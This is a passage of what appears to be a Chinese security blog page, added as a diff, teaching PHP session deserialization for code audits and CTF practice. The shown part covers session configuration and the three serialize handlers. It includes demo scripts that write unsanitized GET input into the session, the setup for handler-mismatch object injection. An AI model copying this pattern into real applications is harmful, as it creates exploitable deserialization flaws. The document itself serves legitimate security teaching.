@@ -1,0 +1,506 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="丨Mr.zhang丨"><meta name="copyright" content="丨Mr.zhang丨"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>session反序列化 | Mr.zhang's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"www.greetdawn.top","root":"/","title":"群哥的博客","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Mr.zhang's Blog" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-121354150-1');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta property="og:type" content="article">
+<meta property="og:title" content="session反序列化">
+<meta property="og:url" content="http://www.greetdawn.top/2019/05/16/web-security/php-code-audit/php-unserialzie-session/index.html">
+<meta property="og:site_name" content="Mr.zhang&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/train-5922321_1920.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%9B%BE.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112152945.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112160923.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210112170119.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113093244.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113101829.png">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210113102232.png">
+<meta property="article:published_time" content="2019-05-16T07:09:45.000Z">
+<meta property="article:modified_time" content="2021-01-29T08:05:43.165Z">
+<meta property="article:author" content="丨Mr.zhang丨">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/train-5922321_1920.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="丨Mr.zhang丨"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="丨Mr.zhang丨"><span class="site-author-status" title="不想上班">😭</span></a><div class="site-author-name"><a href="/about/">丨Mr.zhang丨</a></div><a class="site-name" href="/about/site.html">Mr.zhang's Blog</a><sub class="site-subtitle">The God love people</sub><div class="site-desciption">Love coding,Love life!</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">46</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=910426929&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/greetdawn" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:953640552@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=372656460" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/478304087" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-session%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">PHP session基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是session?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">php session的工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%9C%A8php-ini%E4%B8%AD%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">session在php.ini中的配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.4.</span> <span class="toc-text">session存储机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E4%B8%89%E7%A7%8D%E5%BC%95%E6%93%8E"><span class="toc-number">1.2.</span> <span class="toc-text">php的三种引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">php处理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">php_binary处理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-serialize%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">php_serialize处理器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-session%E5%8F%8D%E5%BA%8F%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">php session反序化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Edemo%EF%BC%88session-demo%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞demo（session_demo）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%AE%9E%E6%88%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session-upload"><span class="toc-number">1.4.1.</span> <span class="toc-text">session_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-jarvis"><span class="toc-number">1.4.2.</span> <span class="toc-text">session_jarvis</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://www.greetdawn.top/2019/05/16/web-security/php-code-audit/php-unserialzie-session/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="丨Mr.zhang丨"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Mr.zhang's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">session反序列化<a class="post-edit-link" href="https://github.com/greetdawn/_posts/web-security/php-code-audit/php-unserialzie-session.md" target="_blank" title="编辑" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2019-05-16 15:09:45" itemprop="dateCreated datePublished" datetime="2019-05-16T15:09:45+08:00">2019-05-16</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2021-01-29 16:05:43" itemprop="dateModified" datetime="2021-01-29T16:05:43+08:00">2021-01-29</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">12m</span></span></span><span class="leancloud_visitors" id="/2019/05/16/web-security/php-code-audit/php-unserialzie-session/" data-flag-title="session反序列化"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:#FB7299" itemprop="url" rel="index"><span itemprop="text">PHP代码审计</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/CTF/" style="--text-color:#4fc08d"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF</span></a><a class="tag" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:#F14E32"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">PHP反序列化</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/train-5922321_1920.jpg" alt="train-5922321_1920" loading="lazy"></p>
+<span id="more"></span>
+
+<h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><h2 id="PHP-session基础"><a href="#PHP-session基础" class="headerlink" title="PHP session基础"></a>PHP session基础</h2><h3 id="什么是session"><a href="#什么是session" class="headerlink" title="什么是session?"></a>什么是session?</h3><p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。</p>
+<p><code>PHP session</code>可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 <code>session</code> 值会存储于服务器端，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<h3 id="php-session的工作流程"><a href="#php-session的工作流程" class="headerlink" title="php session的工作流程"></a>php session的工作流程</h3><p>(1) 开始会话时，<code>php</code>会尝试从请求中查找会话<code>id</code>。若发现请求信息中不存在<code>session id</code>，<code>php</code>就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在响应头中使用<code>set-cookie</code>头部发送给客户端保存;</p>
+<p>(2) <code>php</code>会将会话中的数据设置到<code>$_SESSION</code>变量中；</p>
+<p>(3) 当会话停止时，会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，发送到保存管理器进行保存。</p>
+<p>具体工作流程图如下：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%9B%BE.png" loading="lazy"></p>
+<h3 id="session在php-ini中的配置"><a href="#session在php-ini中的配置" class="headerlink" title="session在php.ini中的配置"></a>session在php.ini中的配置</h3><ul>
+<li><p>session.gc_divisor</p>
+<p>php session垃圾回收机制相关配置</p>
+</li>
+<li><p>session.sid_bits_per_character</p>
+<p>指定编码的会话ID字符中的位数</p>
+</li>
+<li><p>session.save_path=””</p>
+<p>该配置主要设置<code>session</code>的存储路径</p>
+</li>
+<li><p>session.save_handler=””</p>
+<p>该配置主要设定用户自定义存储函数，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
+</li>
+<li><p>session.use_strict_mode</p>
+<p>严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</p>
+</li>
+<li><p>session.use_cookies</p>
+<p>指定是否在客户端用 cookie 来存放会话 ID，默认启用</p>
+</li>
+<li><p>session.cookie_secure</p>
+<p>指定是否仅通过安全连接发送 <code>cookie</code>，默认关闭</p>
+</li>
+<li><p>session.use_only_cookies</p>
+<p>指定是否在客户端<em>仅仅</em>使用<code>cookie</code>来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击</p>
+</li>
+<li><p>session.name</p>
+<p>指定会话名以用做 <code>cookie</code> 的名字，只能由字母数字组成，默认为 <code>PHPSESSID</code></p>
+</li>
+<li><p>session.auto_start</p>
+<p>指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</p>
+</li>
+<li><p>session.cookie_lifetime</p>
+<p>指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示“直到关闭浏览器”。默认为 <em>0</em></p>
+</li>
+<li><p>session.cookie_path</p>
+<p>指定要设置会话<code>cookie</code> 的路径，默认为 <em>/</em></p>
+</li>
+<li><p>session.cookie_domain</p>
+<p>指定要设置会话<code>cookie</code> 的域名，默认为无，表示根据 <code>cookie</code> 规范产生<code>cookie</code>的主机名</p>
+</li>
+<li><p>session.cookie_httponly</p>
+<p>将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</p>
+</li>
+<li><p>session.serialize_handler</p>
+<p>定义用来序列化/反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
+</li>
+<li><p>session.gc_probability</p>
+<p>该配置项与 <code>session.gc_divisor</code> 合起来用来管理 <code>garbage collection</code>，即垃圾回收进程启动的概率</p>
+</li>
+<li><p>session.gc_divisor</p>
+<p>该配置项与<code>session.gc_probability</code>合起来定义了在每个会话初始化时启动垃圾回收进程的概率</p>
+</li>
+<li><p>session.gc_maxlifetime</p>
+<p>指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在<code>session</code>启动的时候开始（ 取决于<code>session.gc_probability</code> 和 <code>session.gc_divisor</code>）</p>
+</li>
+<li><p>session.referer_check</p>
+<p>包含有用来检查每个 <code>HTTP Referer</code>的子串。如果客户端发送了<code>Referer</code>信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</p>
+</li>
+<li><p>session.cache_limiter</p>
+<p>指定会话页面所使用的缓冲控制方法（<code>none/nocache/private/private_no_expire/public</code>）。默认为 <code>nocache</code></p>
+</li>
+<li><p>session.cache_expire</p>
+<p>以分钟数指定缓冲的会话页面的存活期，此设定对<code>nocache</code>缓冲控制方法无效。默认为 180</p>
+</li>
+<li><p>session.use_trans_sid</p>
+<p>指定是否启用透明 SID 支持。默认禁用</p>
+</li>
+<li><p>session.sid_length</p>
+<p>配置会话ID字符串的长度。 会话ID的长度可以在22到256之间。默认值为32。</p>
+</li>
+<li><p>session.trans_sid_tags</p>
+<p>指定启用透明sid支持时重写哪些HTML标签以包括会话ID</p>
+</li>
+<li><p>session.trans_sid_hosts</p>
+<p>指定启用透明sid支持时重写的主机，以包括会话ID</p>
+</li>
+<li><p>session.sid_bits_per_character</p>
+<p>配置编码的会话ID字符中的位数</p>
+</li>
+<li><p>session.upload_progress.enabled</p>
+<p>启用上传进度跟踪，并填充<code>$ _SESSION</code>变量， 默认启用。</p>
+</li>
+<li><p>session.upload_progress.cleanup</p>
+<p>读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</p>
+</li>
+<li><p>session.upload_progress.prefix</p>
+<p>配置<code>$ _SESSION</code>中用于上传进度键的前缀，默认为<code>upload_progress_</code></p>
+</li>
+<li><p>session.upload_progress.name</p>
+<p><code>$ _SESSION</code>中用于存储进度信息的键的名称，默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>
+</li>
+<li><p>session.upload_progress.freq</p>
+<p>定义应该多长时间更新一次上传进度信息</p>
+</li>
+<li><p>session.upload_progress.min_freq</p>
+<p>更新之间的最小延迟</p>
+</li>
+<li><p>session.lazy_write</p>
+<p>配置会话数据在更改时是否被重写，默认启用</p>
+</li>
+</ul>
+<h3 id="session存储机制"><a href="#session存储机制" class="headerlink" title="session存储机制"></a>session存储机制</h3><p>(1) 由<code>session.serialize_handler</code>来定义引擎；</p>
+<p>(2) 默认以文件的方式存储；</p>
+<p>(3) 文件命名方式以sess_sessionid;</p>
+<p>(4) 文件内容是一序列化的方式进行存储；</p>
+<h2 id="php的三种引擎"><a href="#php的三种引擎" class="headerlink" title="php的三种引擎"></a>php的三种引擎</h2><p><code>session.serialize_handler</code>定义了三种引擎：</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过<code>serialize()</code>函数序列化处理的数组</td>
+</tr>
+</tbody></table>
+<p>注：自 PHP 5.5.4 起可以使用<code>php_serialize</code></p>
+<h3 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h3><p>代码实例</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// php | php_binary | php_serialize</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>请求后保存的session文件内容的结果为:</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name">session</span><span class="token operator">|</span><span class="token class-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"greetdawn"</span><span class="token punctuation">;</span>
+<span class="token comment"># 格式：键名 + | + 序列化后的参数值</span></code></pre>
+
+
+
+<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>代码实例</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// php | php_binary | php_serialize</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwdpasswdpasswdpasswdpasswdpassw'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>请求后保存的session文件内容的结果为:</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#passwdpasswdpasswdpasswdpasswdpassws:9:"greetdawn";</span>
+<span class="token comment">#为键名长度对应的ascii值，passwdpasswdpasswdpasswdpasswdpassws为键名，后面为get参数序列化之后的值</span></code></pre>
+
+
+
+<h3 id="php-serialize处理器"><a href="#php-serialize处理器" class="headerlink" title="php_serialize处理器"></a>php_serialize处理器</h3><p>代码实例</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// php | php_binary | php_serialize</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>请求后保存的session文件内容的结果为:</p>
+<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"passwd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"greetdawn"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token comment">#标准化的序列化字符串格式</span></code></pre>
+
+
+
